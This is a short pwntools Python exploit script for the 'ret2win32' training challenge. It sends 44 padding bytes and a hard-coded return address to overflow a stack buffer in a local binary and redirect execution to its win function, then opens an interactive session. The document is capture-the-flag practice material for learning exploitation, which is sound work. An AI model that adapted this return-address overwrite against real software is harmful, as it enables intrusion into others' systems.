from pwn import *

p = process("./ret2win32")
raw_input("DEBUG")

payload = b"A"*44
payload += p32(0x804862c)

p.sendline(payload)

p.interactive()
